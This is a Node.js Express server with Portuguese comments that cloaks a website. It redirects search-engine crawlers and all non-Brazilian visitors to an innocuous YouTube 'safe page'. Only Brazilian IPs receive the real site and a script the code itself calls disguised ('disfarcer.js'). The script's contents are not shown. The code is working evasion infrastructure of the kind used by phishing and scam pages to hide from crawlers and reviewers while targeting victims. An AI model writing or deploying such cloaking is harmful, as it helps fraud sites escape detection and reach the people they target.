const express = require('express');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const port = 3000;

// --- URL DE REDIRECIONAMENTO (ALTERE AQUI) ---
const SAFE_PAGE_URL = 'https://www.youtube.com/watch?v=qgqOAYCJa94'; // URL externa para bots e tráfego de fora do Brasil

// Lista de User-Agents de bots conhecidos
const botUserAgents = [
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver'
];

// Configuração do Rate Limiter
const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 100, // Limite de 100 requisições por IP por minuto
  standardHeaders: true,
  legacyHeaders: false,
});
app.use(limiter);

// Middleware para servir arquivos estáticos do diretório pai (onde está o index.html)
const staticServer = express.static(path.join(__dirname, '..'));

// Middleware principal de verificação e redirecionamento
app.use(async (req, res, next) => {
  // 1. Detecção de Bot
  const userAgent = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : '';
  const isBot = botUserAgents.some(bot => userAgent.includes(bot));
  if (isBot) {
    return res.redirect(SAFE_PAGE_URL);
  }

  // 2. Verificação de IP
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // Para desenvolvimento local, serve o conteúdo principal e o script
  if (ip === '::1' || ip === '127.0.0.1') {
    if (req.path === '/ds.js') {
      return res.sendFile(path.join(__dirname, 'disfarcer.js'));
    }
    return staticServer(req, res, next);
  }

  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();

    // 3. Verifica se é do Brasil
    if (data.status === 'success' && data.countryCode === 'BR') {
      // Se for do Brasil, serve o script disfarçado ou os arquivos estáticos
      if (req.path === '/ds.js') {
        return res.sendFile(path.join(__dirname, 'disfarcer.js'));
      }
      return staticServer(req, res, next);
    } else {
      // Se não for do Brasil ou a API falhar, redireciona para a página de segurança
      return res.redirect(SAFE_PAGE_URL);
    }
  } catch (error) {
    // Em caso de erro na requisição, redireciona para a página de segurança como precaução
    return res.redirect(SAFE_PAGE_URL);
  }
});

app.listen(port, () => {
  // O servidor está rodando silenciosamente.
});